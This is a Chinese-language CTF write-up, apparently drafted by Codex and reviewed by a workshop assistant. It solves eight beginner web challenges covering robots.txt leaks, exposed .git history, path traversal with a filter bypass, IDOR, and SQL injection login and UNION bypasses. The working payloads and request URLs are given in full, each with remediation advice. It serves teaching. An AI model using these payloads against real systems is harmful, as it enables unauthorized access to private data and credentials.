---
title: ctf.ga24.me Writeup
published: 2026-08-01
updated: 2026-08-01
description: 臨時小筆記，有簡單教學
tags: [OSGA, CTF, 資安]
category: 程式
draft: false
---

::link{url="https://ctf.ga24.me/" text="ctf.ga24.me" }

:::important
本文章完全由 Codex 撰寫，已進行人工校稿，請仔細甄別是否有誤。
:::

# 前言

這份筆記是AI寫的，原本想要自己寫但好累，所以讓 AI 代筆，然後我這都自己破台的，我也有審過筆記，所以應該還行:D
阿對了，會想用這個筆記是因為我是這次一日資安體驗營的助教（台北、台中場），所以就順便把這幾題記錄下來 :D

然後這個 CTF 的題目都還蠻適合入門的，主要集中在 Web 常見的幾個漏洞：資訊洩漏、Path Traversal、IDOR 和 SQL Injection。下面會把我實際觀察到的東西和請求方式寫出來，之後忘記的時候也比較方便回來看。

> WP完成度： (8/8)

# Web / Info Leak

## [Curious Crawler](https://ctf.ga24.me/challenges#Curious%20Crawler-1) (100)

### 題目

Acme Corp 剛上線他們的新官網，看起來平平無奇……不過爬蟲有時候會發現一些人類沒注意到的東西。

網站：<https://web01.ctf.ga24.me>

### 解題心得

看到題目名稱是 `Curious Crawler`，而且題目特別說「爬蟲會發現人類沒注意到的東西」，我第一個想到的就是 `robots.txt`。

直接打開：

```text
https://web01.ctf.ga24.me/robots.txt
```

得到：

```txt
User-agent: *
Disallow: /admin_hidden_x8k/
Disallow: /internal-notes/
```

`robots.txt` 只是告訴搜尋引擎不要爬某些路徑，完全不是權限控制，所以看到這種奇怪的路徑就直接訪問看看。進入 `/admin_hidden_x8k/` 後，可以找到一個不該出現在網站上的備份檔：

```text
/admin_hidden_x8k/config.php.bak
```

檔案裡面除了資料庫帳號密碼，也直接把 API token 寫在裡面：

```php
$API_TOKEN = "FLAG{r0b0ts_txt_1s_n0t_s3cur1ty}";
```

這題的重點就是不要把 `robots.txt` 當成安全機制，也不要把 `.bak`、`.old`、`.zip` 這類備份檔留在 production 網站上。

### Flag

```txt
FLAG{r0b0ts_txt_1s_n0t_s3cur1ty}
```

## [Version Control](https://ctf.ga24.me/challenges#Version%20Control-2) (250)

### 題目

ShopMini 團隊上線了他們的新網站！開發時他們用了 git 管理原始碼。聽說有位新來的工程師曾經不小心把敏感檔案 commit 進去，後來雖然刪掉了……但事情有這麼簡單嗎？

網站：<https://web02.ctf.ga24.me>

### 解題心得

這題會先簡單介紹一下 Git，因為如果平常只有用 GitHub 的網頁介面，可能不太熟悉 Git repository 裡面到底放了什麼。

Git 是一套版本控制系統，主要用來記錄程式碼每一次的變更。每次執行 `git commit`，Git 就會把當下的檔案狀態記錄成一個 commit。幾個常見的概念如下：

- **repository（repo）**：整個 Git 專案，通常就是包含 `.git/` 的資料夾。
- **commit**：某一個時間點的版本，包含作者、訊息、父 commit 和檔案樹。
- **tree**：記錄某個目錄有哪些檔案或子目錄。
- **blob**：實際儲存檔案內容的 Git object。
- **branch**：指向某個 commit 的名稱，例如 `main`。

所以即使在最新版本把檔案刪掉，早期 commit 的 tree 還是可能指向原本的 blob。只要舊 commit 還沒有被清理，刪掉的密碼或 token 就不算真正消失。

題目直接提到 git，而且網站是靜態頁面，所以先試試看根目錄的 `.git`：

```bash
curl https://web02.ctf.ga24.me/.git/HEAD
```

回應是：

```txt
ref: refs/heads/main
```

`.git/HEAD` 是 Git 用來記錄目前分支的位置。這裡能直接讀到 `main`，表示網站把 Git repository 的內部檔案暴露出來了。正常的 production 網站不應該讓使用者讀到這個目錄。

手動一個一個下載 `.git/objects` 當然可以，但這題可以直接使用 `git-dumper`。`git-dumper` 是一個專門處理「暴露 `.git` 目錄」的工具，它會從 HTTP 下載 Git 的 metadata 和 objects，然後在本機還原成可以用一般 Git 指令操作的 repository。

安裝工具（擇一即可）：

```bash
pipx install git-dumper
# 或者
pip install git-dumper
```

接著把題目的 repository dump 下來：

```bash
git-dumper https://web02.ctf.ga24.me/ ./web02-dump
cd ./web02-dump
```

如果成功，資料夾裡會看到一般的網站檔案，也會有 `.git/`。現在這個資料夾就是一個本地 Git repo，可以用基本 Git 指令檢查：

```bash
git status
git branch -a
git log --oneline --all --decorate
```

題目的 commit history 大致如下：

```txt
a632553 Add .gitignore and minor style tweaks
812a927 Remove accidentally committed credentials file
cac9927 Initial import of ShopMini site
```

先查看目前 dump 下來的 commit history：

```bash
git log --oneline --all --decorate
```

可以看到最早的 `cac9927` 是初始版本，後來的 `812a927` 才出現「刪除 credentials」的 commit。既然檔案是在最早版本出現的，就直接切回那個版本：

```bash
git switch --detach cac9927
```

這裡使用 `--detach` 是因為 `cac9927` 是一個 commit，不是 branch。切換後 Git 可能會顯示 `detached HEAD`，意思是目前暫時停在某個歷史版本，這很適合拿來查看舊檔案。

切回舊版本後，先列出檔案：

```bash
ls -la
```

這時候就會看到目前版本原本存在、但新版本已經刪掉的 `secret_credentials.txt`。直接把它印出來：

```bash
cat secret_credentials.txt
```

內容如下：

```txt
# Production credentials — DO NOT COMMIT
AWS_ACCESS_KEY_ID=AKIA5EXAMPLEACMEDEV
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
INTERNAL_API_TOKEN=FLAG{n3v3r_c0mm1t_s3cr3ts_t0_g1t_h1st0ry}
```

看完之後可以切回原本的主分支：

```bash
git switch main
```

重點是，`git rm` 或直接刪檔案只會建立一個「檔案不存在」的新版本，不會自動抹除舊 commit 裡的內容。也可以用下面的指令找出哪個 commit 刪掉了檔案：

```bash
git log --all --diff-filter=D --summary
```

這裡就會看到 `Remove accidentally committed credentials file`。

查看 reflog 也可以看到完整的 commit 變化：

```bash
curl https://web02.ctf.ga24.me/.git/logs/HEAD
```

可以看到三個 commit，其中第二個 commit 的訊息是：

```txt
commit: Remove accidentally committed credentials file
```

這種「刪掉檔案」不代表歷史紀錄消失。從 Git 的結構來看，新的 commit 只是不再讓目前的 tree 指向 `secret_credentials.txt`，舊 commit 仍然保留原本的 blob，所以切回舊版本後就可以用一般的 `ls` 和 `cat` 找回內容。

所以這題不是看目前網站的 HTML，而是要回到 Git history 找已經被刪掉的檔案。實務上 public server 不應該暴露 `.git`，而且就算檔案已經刪除，曾經 commit 過的 secret 也應該全部 rotate。

### Flag

```txt
FLAG{n3v3r_c0mm1t_s3cr3ts_t0_g1t_h1st0ry}
```

# Web / Path Traversal

## [InternalDocs Wiki](https://ctf.ga24.me/challenges#InternalDocs%20Wiki-3) (150)

### 題目

InternalDocs 是 XXX 公司剛推出的內部 wiki。看起來只是個很單純的文件閱讀器……但也許太單純了？

網站：<https://web03.ctf.ga24.me>

### 解題心得

首頁列出了幾個文件連結：

```text
/view?page=welcome.txt
/view?page=changelog.txt
/view?page=contact.txt
```

這種把檔名放在 query parameter 的功能，很常見的問題就是後端直接把輸入接到 `open()`。既然沒有看到任何登入或權限驗證，就把 `page` 改成上一層路徑：

```text
https://web03.ctf.ga24.me/view?page=../../flag.txt
```

回應直接是：

```txt
FLAG{p4th_tr4v3rs4l_1s_th3_cl4ss1c_w3b_bug}
```

這就是最基本的 Path Traversal。`../` 代表目前目錄的上一層，當程式把使用者輸入當作檔案路徑時，就可以離開原本限制的文件目錄，讀取其他位置的檔案。

### Flag

```txt
FLAG{p4th_tr4v3rs4l_1s_th3_cl4ss1c_w3b_bug}
```

## [ManualHub v2 — Secured](https://ctf.ga24.me/challenges#ManualHub%20v2%20%E2%80%94%20Secured-4) (300)

### 題目

在被 pentester 爆了 Path Traversal 之後，ManualHub 團隊上線 v2，把使用者輸入通通經過 `sanitize()` 過濾。

「這次我們超安全，`../` 通通擋掉。」真的嗎？

網站：<https://web04.ctf.ga24.me>

附件：`app.py`

### 解題心得

這題有附原始碼，所以直接先看 `sanitize()`：

```python
def sanitize(name: str) -> str:
    return name.replace("../", "")
```

問題是它只做一次字串替換，而且沒有遞迴檢查。輸入：

```text
....//....//flag.txt
```

在過濾時，外層的 `../` 會被移除，但原本藏在字串裡的另一層 traversal 會留下來。最後就能變成類似：

```text
../../flag.txt
```

實際請求：

```text
https://web04.ctf.ga24.me/download?file=....//....//flag.txt
```

回應就是 flag：

```txt
FLAG{n0n_r3curs1v3_f1lt3rs_g3t_nest3d_by_d0ts}
```

這題告訴我們，黑名單替換本身就很容易被繞過。比較正確的做法是把路徑 canonicalize 後，再確認結果仍然位於允許的 base directory 裡，而不是只刪幾個字串。

### Flag

```txt
FLAG{n0n_r3curs1v3_f1lt3rs_g3t_nest3d_by_d0ts}
```

# Web / IDOR

## [MyJournal](https://ctf.ga24.me/challenges#MyJournal-5) (150)

### 題目

「MyJournal」是一個私人日誌 App。每個使用者只能看到自己寫的日誌……應該吧？

網站：<https://web05.ctf.ga24.me>

測試帳號：`alice / alice123`、`bob / bob123`

### 解題心得

先用題目提供的 Alice 帳號登入。登入後首頁列出了：

```text
/journal/3
/journal/5
/journal/6
```

這些都是 Alice 自己的日誌。因為網址直接使用連續的數字 ID，所以我就把 ID 改成其他數字試試看：

```text
https://web05.ctf.ga24.me/journal/1
```

結果竟然可以直接看到 owner 是 admin 的日誌：

```txt
只有我（admin）看得到這篇。
1. DB 密碼輪換
2. 內部 API token 輪換 → 新 token: FLAG{id0r_1s_ju5t_ch4ng1ng_th3_numb3r}
3. VPN cert 續期
```

這就是 IDOR（Insecure Direct Object Reference）。程式只確認「使用者有登入」，卻沒有確認這個 journal 的 `owner_id` 是否等於目前登入者。只要把物件 ID 改掉，就能讀到別人的私人資料。

### Flag

```txt
FLAG{id0r_1s_ju5t_ch4ng1ng_th3_numb3r}
```

## [SupportDesk](https://ctf.ga24.me/challenges#SupportDesk-6) (300)

### 題目

公司剛導入了 SupportDesk 內部工單系統。工程主管很有信心：「所有 ticket ID 都用 UUID，開發時也都有做 ownership check，這次萬無一失。」

用測試帳號登入，看看能不能挖到 admin 藏在私人 ticket 裡的 API token。

網站：<https://web06.ctf.ga24.me>

測試帳號：`alice / alice123`

附件：`app.py`

### 解題心得

這題看起來 UUID 很難猜，但題目也說了可以對比三個 endpoint 的授權差異，所以我先看原始碼。

`/tickets/<ticket_uuid>` 和 `/api/tickets/<ticket_uuid>` 都有檢查 ticket owner：

```python
if t["owner_id"] != uid:
    return jsonify({"error": "forbidden"}), 403
```

但 `/api/replies/<rid>` 使用的是整數 reply ID，而且少了同樣的 ownership check：

```python
@app.route("/api/replies/<int:rid>")
def api_reply(rid):
    r = REPLIES.get(rid)
    if not r:
        return jsonify({"error": "not found"}), 404

    return jsonify({
        "id": rid,
        "ticket": r["ticket"],
        "author_id": r["author_id"],
        "body": r["body"],
    })
```

登入 Alice 後直接請求：

```text
https://web06.ctf.ga24.me/api/replies/42
```

即使 reply 42 屬於 admin 的 ticket，API 還是照樣回傳：

```json
{
  "author_id": 1,
  "body": "順帶記錄一下：新產生的 API token = FLAG{ch1ld_0bj3cts_n33d_auth_t00}",
  "id": 42,
  "ticket": "9f2c8e63-1c0a-4c3f-a1e7-3f9f5a2c1a01"
}
```

這題的重點是：UUID 只能降低「猜 ID」的機率，不能取代 authorization。就算 parent ticket 有做權限檢查，child object（reply）也必須重新確認它所屬的 ticket 是否屬於目前使用者。

### Flag

```txt
FLAG{ch1ld_0bj3cts_n33d_auth_t00}
```

# Web / SQL Injection

## [MiniBoard](https://ctf.ga24.me/challenges#MiniBoard-7) (150)

### 題目

MiniBoard 是公司內部的員工布告欄，只有註冊員工可以登入。你沒有帳號，但……有 SQL Injection。

網站：<https://web07.ctf.ga24.me>

### 解題心得

登入頁只有 `username` 和 `password`，而且題目已經明示有 SQL Injection，所以直接測試最基本的登入繞過：

```text
username=' OR 1=1 -- 
password=x
```

這樣後端如果是把輸入直接串進類似下面的查詢：

```sql
SELECT * FROM users
WHERE username = '' OR 1=1 -- '
AND password = 'x';
```

`1=1` 永遠為真，而 `--` 會把後面的密碼條件註解掉，所以不需要知道任何員工密碼就能登入。送出後會被導向 `/dashboard`，頁面顯示目前身份是 admin，並且在個人簡介裡看到：

```txt
internal notes: monthly rotation done.
flag = FLAG{unsan1t1z3d_1nput_g03s_str41ght_1nt0_sql}
```

### Flag

```txt
FLAG{unsan1t1z3d_1nput_g03s_str41ght_1nt0_sql}
```

## [BookHub — Secure Search](https://ctf.ga24.me/challenges#BookHub%20%E2%80%94%20Secure%20Search-8) (300)

### 題目

BookHub 上一版被 pentester 爆了 SQL Injection。v2 上線了「Secure Search」：所有 query 經過 `sanitize()`，過濾 `union` / `select` 關鍵字（不分大小寫）。

「這次真的安全了。」真的嗎？

網站：<https://web08.ctf.ga24.me>

附件：`app.py`

### 解題心得

這題同樣有附原始碼。先看過濾器：

```python
def sanitize(q: str) -> str:
    for word in ("union", "select"):
        q = re.sub(word, "", q, flags=re.IGNORECASE)
    return q
```

查詢本身卻仍然是字串串接：

```python
sql = f"SELECT title, author, published_year FROM books WHERE title LIKE '%{q}%'"
```

所以問題只剩下如何繞過關鍵字黑名單。因為 `replace` 只做一次，所以把關鍵字再包一層就可以了：

```text
UNUNIONION
Selselectect
```

過濾一次之後會分別變回：

```text
UNION
SELECT
```

實際送出的搜尋字串是：

```text
' UNUNIONION Selselectect name,value,0 from secrets--
```

最後組出的 SQL 等價於：

```sql
SELECT title, author, published_year FROM books
WHERE title LIKE '%' UNION SELECT name, value, 0 FROM secrets--%'
```

這段 SQL 可以拆成幾個部分來看：

```sql
SELECT title, author, published_year
```

`SELECT` 是「我要取出哪些欄位」。原本的搜尋頁會取出書名、作者和出版年份，所以第一個查詢總共會回傳三欄。

```sql
FROM books
```

`FROM` 是指定資料來源，這裡代表從 `books` 這張書籍資料表讀資料。

```sql
WHERE title LIKE '%...%'
```

`WHERE` 是篩選條件，`LIKE` 是模糊比對。`%` 是 SQL wildcard，代表任意長度的文字，所以原本的意思是「只要書名中包含搜尋字串就列出來」。外層的單引號則是包住 SQL 字串。

payload 開頭的這個單引號：

```text
'
```

會先把原本 `LIKE '%{q}%'` 裡的字串提早關閉。這樣後面的內容就不再只是搜尋文字，而會被資料庫當成新的 SQL 語法。

```sql
UNION
```

`UNION` 會把兩個 `SELECT` 的結果合併成同一份結果。使用 `UNION` 時，前後兩個查詢必須有相同數量的欄位，而且對應欄位的型別要能相容；這就是為什麼後面也要準備三個欄位。

```sql
SELECT name, value, 0
```

這是第二個查詢。`name` 和 `value` 是我們真正想看的 secret 欄位，最後的 `0` 是一個固定的整數，只是用來補足第三欄，對應前面查詢的 `published_year`。它不是從資料表讀出來的欄位，而是每一筆結果都固定填入 0。

```sql
FROM secrets
```

代表第二個查詢要從 `secrets` 資料表讀取資料。這張表裡剛好有 `internal_api_token`，所以 flag 會出現在第二欄 `value`。

```sql
--
```

在 SQLite 裡，`--` 後面到該行結尾都會被當成註解。原本程式最後還會自動補上 `%` 和單引號：

```sql
--%'
```

但因為已經被註解掉，所以不會再破壞我們前面組好的 SQL。

整個 payload 的意思可以用白話翻成：「先結束原本的搜尋字串，接著把 `secrets` 表的 `name`、`value` 查出來，並補一個 0 讓欄位數量一致，最後把程式自動加上的尾巴註解掉。」

因為兩邊都是三個欄位，UNION 可以正常執行，結果就會把 `secrets` 表的內容一起列出來：

```txt
db_backup_key       not-the-flag-this-is-a-decoy
internal_api_token  FLAG{sqli_f1lter_bl4ckl1st_g3ts_n3st3d}
smtp_password       please-rotate-me
```

這題和上一題一樣，真正的修補方式不是一直增加關鍵字黑名單，而是使用 parameterized query；如果需要搜尋表名或欄位，也要用明確的 allowlist 控制。

### Flag

```txt
FLAG{sqli_f1lter_bl4ckl1st_g3ts_n3st3d}
```

## 總結

AI 還是太好用了:D 我我不需要很麻煩的自己寫文章，反正我都看過了，也大概是我的解法，就醬吧:D